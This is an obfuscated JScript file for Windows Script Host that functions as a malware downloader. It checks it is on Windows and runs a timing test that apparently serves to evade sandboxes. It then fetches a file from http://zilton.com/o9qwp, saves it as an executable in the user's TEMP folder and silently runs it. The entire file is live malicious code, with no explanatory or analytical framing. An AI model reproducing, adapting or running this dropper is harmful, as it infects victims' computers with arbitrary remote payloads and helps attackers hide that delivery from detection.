var ZA = false;
var c = "CreateObject";
var x0 = function ED() {return WScript[c]("WScript.Shell");}(), qM = 11;
var hl = "MSXML2.XMLHTTP";
var S = 2123213;
var pF = 0;
function U(k){x0["Run"](k, pF, pF);};
function bZ(){return "" + hl;};
function a(v, J){pF = pF * 1; return v - J;};
function x(){return c;};
/*@cc_on
  @if (@_win32 || @_win64)
    ZA = true;
  @end
@*/
if (ZA)
{
var I = "";
function T(){return 22;};
var S0 = 0; var Pr = 0;
function g()
{
var VQ = new this["Date"]();
var Q = VQ["getUTCMilliseconds"]();
WScript["Sleep"](T());
var VQ = new this["Date"]();
var h = VQ["getUTCMilliseconds"]();
WScript["Sleep"](T());
var VQ = new this["Date"]();
var aq = VQ["getUTCMilliseconds"]();
var S0 = "qr";
S0 = a(h, Q);
var Pr = "GG";
Pr = a(aq, h);
I = "open";
return a(S0, Pr);
}
var H = false;
var K0 = false;
for (var ut = pF; ut < T() * 1; ut++){if (g() != pF){
H = true; 
Pr = "31" + 11 * S0 + Pr; 
K0 = true; 
break;
}}
function UM() {return ((H == true) && (H == K0)) ? 1 : pF;};
if (H && UM() && K0){
function y() {return x0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Q3aWyGjPCCdW2WYX.exe";};
 vD = bZ();
 jA = WScript[c](vD);
 var q = 1;
 while (q){
try {
jA[I]("GET", "http://zilton.com/o9qwp", false);
jA["send"]();
Ev = "Sleep";
for (;;){WScript[Ev](T() * 11); if (jA["readystate"] >= 2 * 2) break;};
q = pF;
} catch(o){};
}
function K(vX) {var b = (1, 2, 3, 4, 5, vX); return b;};
FB = WScript[x()]("ADODB.Stream");
vD = FB;
vD[I]();
vD["type"] = K(1);
vD["write"](jA["ResponseBody"]);
FB["position"] = K(pF);
vD["Save" + "ToFile"](y(), 2);
FB["c"+"lose"]();
XI = y();
U(XI);
}
}

